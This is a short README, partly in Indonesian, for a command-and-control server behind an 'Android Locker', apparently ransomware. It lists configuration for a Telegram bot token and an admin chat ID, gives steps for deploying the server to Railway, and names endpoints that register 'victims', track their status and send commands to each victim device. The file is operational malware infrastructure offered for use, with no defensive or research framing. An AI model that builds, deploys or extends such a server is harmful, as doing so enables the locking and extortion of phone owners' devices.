# C2 Server for Android Locker

## Environment Variables
- `BOT_TOKEN` : Telegram bot token (dari @BotFather)
- `ADMIN_CHAT_ID` : Chat ID admin (integer)
- `PORT` : default 8080 (Railway otomatis)

## Deploy ke Railway
1. Upload repo ke GitHub
2. Koneksikan ke Railway, pilih "Deploy from GitHub"
3. Set environment variables di dashboard Railway
4. Railway akan membaca Procfile dan menjalankan server

## Endpoint
- `POST /register` : daftar victim baru
- `POST /status` : update status victim
- `GET /command/<device_id>` : ambil perintah untuk victim